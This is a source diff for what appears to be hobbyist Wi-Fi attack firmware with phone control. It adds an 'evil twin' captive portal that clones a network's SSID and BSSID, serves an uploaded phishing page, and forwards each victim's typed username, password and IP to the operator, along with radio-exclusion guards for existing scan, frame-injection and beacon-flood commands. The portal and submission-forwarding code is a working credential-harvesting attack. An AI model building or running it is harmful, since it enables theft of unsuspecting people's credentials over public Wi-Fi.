@@ -40,6 +40,7 @@
 #include "beacon_pool.h"
 #include "wardrive.h"
 #include "nrf24.h"
+#include "portal.h"
 
 // nRF24 init-once flag. Declared at file scope because cmd_status references it.
 static bool g_nrf_init_done = false;
@@ -238,6 +239,7 @@ static const uint8_t g_an_count = 11;
 static void cmd_scan(uint8_t id) {
     if (g_scan_id >= 0) { send_error(id, "scan already running"); return; }
     if (g_an_active) { send_error(id, "channel analyzer running"); return; }
+    if (portal_running()) { send_error(id, "portal running — the radio is an AP"); return; }
 
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
@@ -311,6 +313,7 @@ static void cmd_capture_start(uint8_t id, JsonDocument& args) {
     // A scan in flight owns the radio. Refuse rather than fight it.
     if (g_scan_id >= 0) { send_error(id, "wifi scan in flight"); return; }
     if (g_an_active) { send_error(id, "channel analyzer running"); return; }
+    if (portal_running()) { send_error(id, "portal running — the radio is an AP"); return; }
     // A burst in flight owns the radio too — see cmd_tx_frame.
     if (tx_running()) { send_error(id, "burst in flight — stop it first"); return; }
     if (probe_reply_running()) { send_error(id, "probe reply running — the radio is answering"); return; }
@@ -407,6 +410,7 @@ static void cmd_tx_frame(uint8_t id, JsonDocument& args) {
     if (beacon_pool_running()) { send_error(id, "beacon pool running — the radio is transmitting"); return; }
     if (g_scan_id >= 0) { send_error(id, "wifi scan in flight"); return; }
     if (g_an_active) { send_error(id, "channel analyzer running"); return; }
+    if (portal_running()) { send_error(id, "portal running — the radio is an AP"); return; }
 
     const char* hex = args["hex"];
     if (!hex) { send_error(id, "missing args.hex"); return; }
@@ -466,6 +470,7 @@ static void cmd_probe_reply_start(uint8_t id, JsonDocument& args) {
     if (tx_running()) { send_error(id, "burst in flight — stop it first"); return; }
     if (g_scan_id >= 0) { send_error(id, "wifi scan in flight"); return; }
     if (g_an_active) { send_error(id, "channel analyzer running"); return; }
+    if (portal_running()) { send_error(id, "portal running — the radio is an AP"); return; }
 
     const char* hex      = args["template_hex"];
     int         ch       = args["channel"]       | (int)1;
@@ -526,6 +531,7 @@ static void cmd_beacon_pool_start(uint8_t id, JsonDocument& args) {
     if (tx_running()) { send_error(id, "burst in flight — stop it first"); return; }
     if (g_scan_id >= 0) { send_error(id, "wifi scan in flight"); return; }
     if (g_an_active) { send_error(id, "channel analyzer running"); return; }
+    if (portal_running()) { send_error(id, "portal running — the radio is an AP"); return; }
 
     int ch = args["channel"] | (int)1;
     JsonArrayConst beacons = args["beacons"].as<JsonArrayConst>();
@@ -583,6 +589,7 @@ static void cmd_wardrive_start(uint8_t id, JsonDocument& args) {
     if (beacon_pool_running()) { send_error(id, "beacon pool running — the radio is transmitting"); return; }
     if (g_scan_id >= 0) { send_error(id, "wifi scan in flight"); return; }
     if (g_an_active) { send_error(id, "channel analyzer running"); return; }
+    if (portal_running()) { send_error(id, "portal running — the radio is an AP"); return; }
 
     int ch = args["channel"] | (int)1;
     if (ch < 1 || ch > 14) { send_error(id, "channel must be 1..14"); return; }
@@ -973,6 +980,138 @@ static void cmd_nrf_sniff(uint8_t id, JsonDocument& args) {
     reply_json(id, true, d);
 }
 
+// ── Captive portal — the evil twin's landing side ───────────────────────────
+// Handlers only; every decision lives in portal.h, so the code the tests
+// exercise is the code that ships. This file is just the phone-facing surface.
+//
+// The portal takes the radio, and refuses rather than fighting for it. Note the
+// asymmetry, which is deliberate: this refuses if anything else is running, and
+// the pre-existing entry points were given a matching portal guard so the
+// refusal goes both ways. One direction alone would let the second caller win by
+// being second.
+
+static void cmd_portal_start(uint8_t id, JsonDocument& args) {
+    if (portal_running()) { send_error(id, "portal already running"); return; }
+    if (cap_running()) { send_error(id, "capture running — stop it first"); return; }
+    if (tx_running()) { send_error(id, "burst in flight — stop it first"); return; }
+    if (probe_reply_running()) { send_error(id, "probe reply running — the radio is answering"); return; }
+    if (beacon_pool_running()) { send_error(id, "beacon pool running — the radio is transmitting"); return; }
+    if (g_scan_id >= 0) { send_error(id, "wifi scan in flight"); return; }
+    if (g_an_active) { send_error(id, "channel analyzer running"); return; }
+    // No portal_running() check here — it is the first line of this handler,
+    // where the message can say "already running" rather than "running".
+
+    const char* ssid = args["ssid"];
+    const char* bssid = args["bssid"];
+    int         ch    = args["channel"] | (int)1;
+    const char* ack   = args["acknowledge"];
+    const char* uri   = args["captive_portal_uri"];
+
+    if (!ssid) { send_error(id, "missing args.ssid"); return; }
+    // Named separately from the ssid check because the two failures need
+    // different fixes: one is a missing field, the other is a gate that has not
+    // been thought about. An omitted acknowledge is not an implicit yes.
+    if (!ack)  { send_error(id, "missing args.acknowledge — this is the arming gate"); return; }
+
+    const char* why = portal_start(ssid, bssid, ch, ack, uri);
+    if (why) { send_error(id, why); return; }
+
+    g_stage = STAGE_ATTACK;
+
+    JsonDocument d;
+    d["started"]        = true;
+    d["attribution"]    = PORTAL_ATTR;
+    d["ssid"]           = g_pt_ssid;
+    d["channel"]        = g_pt_ch;
+    d["cloned_bssid"]   = g_pt_have_bssid;
+    d["uri"]            = g_pt_uri;
+    d["ap_up"]          = g_pt_ap_up;
+    // The honest ceiling of what this board knows. The AP interface came up and
+    // is beaconing; whether a given stranger's phone finds it is not something
+    // we can observe, so the reply does not imply it.
+    d["note"]           = "ap up — seeding is a scan, the pick is the operator's";
+    reply_json(id, true, d);
+}
+
+static void cmd_portal_stop(uint8_t id) {
+    if (!portal_running()) { send_error(id, "portal not running"); return; }
+    portal_stop();
+    if (!cap_running() && !tx_running() && !probe_reply_running() && !beacon_pool_running()) {
+        g_stage = STAGE_IDLE;
+        emit_event("stage", stage_name(g_stage));
+    }
+    JsonDocument d;
+    d["stopped"] = true;
+    // Said out loud because it is the one guarantee this feature makes about
+    // data: stopping wipes the page and every queued submission from RAM.
+    d["wiped"] = "page and queued submissions cleared from RAM";
+    reply_json(id, true, d);
+}
+
+static void cmd_portal_status(uint8_t id) {
+    JsonDocument d;
+    d["running"]       = g_pt_on;
+    d["ap_up"]         = g_pt_ap_up;
+    d["ssid"]          = g_pt_ssid;
+    d["channel"]       = g_pt_ch;
+    d["uri"]           = g_pt_uri;
+    d["page_bytes"]    = (uint32_t)g_pt_page_len;
+    d["page_loaded"]   = (g_pt_page_len > 0);
+    d["page_pushing"]  = g_pt_page_open;
+    d["stations"]      = (uint32_t)WiFi.softAPgetStationNum();
+    d["stations_ever"] = g_pt_stations_ever;
+    // DNS split three ways on purpose: answered / refused / bad are different
+    // facts, and a single "dns" counter would hide the one that matters — a
+    // client sending us nothing we can parse.
+    d["dns_queries"]   = g_pt_dns_queries;
+    d["dns_answered"]  = g_pt_dns_answered;
+    d["dns_refused"]   = g_pt_dns_refused;
+    d["dns_bad"]       = g_pt_dns_bad;
+    d["http_gets"]     = g_pt_http_gets;
+    d["http_posts"]    = g_pt_http_posts;
+    d["http_other"]    = g_pt_http_miss;
+    d["subs_taken"]    = g_pt_subs_taken;
+    d["subs_blank"]    = g_pt_subs_blank;
+    d["subs_queued"]   = g_pt_sub_count;
+    d["uptime_ms"]     = g_pt_on ? (uint32_t)(millis() - g_pt_started_ms) : 0;
+    reply_json(id, true, d);
+}
+
+static void cmd_portal_page_begin(uint8_t id) {
+    if (!portal_page_begin()) { send_error(id, "portal not running"); return; }
+    JsonDocument d;
+    d["begin"] = true;
+    d["max"]   = (uint32_t)(PORTAL_PAGE_MAX - 1);
+    reply_json(id, true, d);
+}
+
+static void cmd_portal_page_chunk(uint8_t id, JsonDocument& args) {
+    const char* hex = args["hex"];
+    if (!hex) { send_error(id, "missing args.hex"); return; }
+    uint8_t buf[1024];
+    size_t  n = 0;
+    if (!pt_parse_hex(hex, buf, sizeof(buf), &n)) {
+        send_error(id, "hex must be even-length and at most 1024 bytes");
+        return;
+    }
+    size_t took = portal_page_chunk(buf, n);
+    JsonDocument d;
+    d["took"]  = (uint32_t)took;
+    d["total"] = (uint32_t)g_pt_page_len;
+    // A short take is reported rather than hidden: a page silently clipped at
+    // the buffer bound would render as a broken form and look like a page bug.
+    if (took < n) d["truncated"] = true;
+    reply_json(id, true, d);
+}
+
+static void cmd_portal_page_end(uint8_t id) {
+    if (!portal_page_end()) { send_error(id, "no page push in flight"); return; }
+    JsonDocument d;
+    d["complete"] = true;
+    d["bytes"]    = (uint32_t)g_pt_page_len;
+    reply_json(id, true, d);
+}
+
 // ── Dispatch ────────────────────────────────────────────────────────────────
 // Case-insensitive on purpose. NRSuite's firmware answers to uppercase ("PING",
 // "SCAN") and the phone app is written against that convention. Ours must accept
@@ -1019,6 +1158,12 @@ static void dispatch(const uint8_t* payload, size_t len, uint8_t id) {
     else if (cmd_is(cmd, "nrf_send"))            cmd_nrf_send(id, args);
     else if (cmd_is(cmd, "nrf_sniff"))           cmd_nrf_sniff(id, args);
     else if (cmd_is(cmd, "nrf_raw"))             cmd_nrf_raw(id);
+    else if (cmd_is(cmd, "portal_start"))        cmd_portal_start(id, args);
+    else if (cmd_is(cmd, "portal_stop"))         cmd_portal_stop(id);
+    else if (cmd_is(cmd, "portal_status"))       cmd_portal_status(id);
+    else if (cmd_is(cmd, "portal_page_begin"))   cmd_portal_page_begin(id);
+    else if (cmd_is(cmd, "portal_page_chunk"))   cmd_portal_page_chunk(id, args);
+    else if (cmd_is(cmd, "portal_page_end"))     cmd_portal_page_end(id);
     else send_error(id, "unknown cmd");
 }
 
@@ -1274,6 +1419,30 @@ void loop() {
 
     // Channel analyzer: steps through channels with a promiscuous counter.
     analyzer_poll();
+
+    // Captive portal: service the DNS socket and the HTTP server, then hand any
+    // captured submission to the phone as an event.
+    //
+    // The drain is gated on a transport actually being connected. A credential
+    // that arrives while the phone is away STAYS in the ring: the whole point of
+    // this feature is that the operator receives what a victim typed, and
+    // emitting into a void would spend it on nobody. The ring is small and
+    // bounded, so an absent phone loses only the oldest overflow, not everything.
+    if (portal_running()) {
+        portal_poll();
+        if (g_connected || g_reply_ch != nullptr) {
+            PortalSub s;
+            while (portal_take_submission(&s)) {
+                JsonDocument d;
+                d["user"]  = s.user;
+                d["pass"]  = s.pass;
+                d["ip"]    = s.ip;
+                d["blank"] = s.blank;
+                d["ms"]    = s.ms;
+                emit_event_json("portal_submission", d);
+            }
+        }
+    }
 
     static uint32_t last = 0;
     if (millis() - last > 5000) {
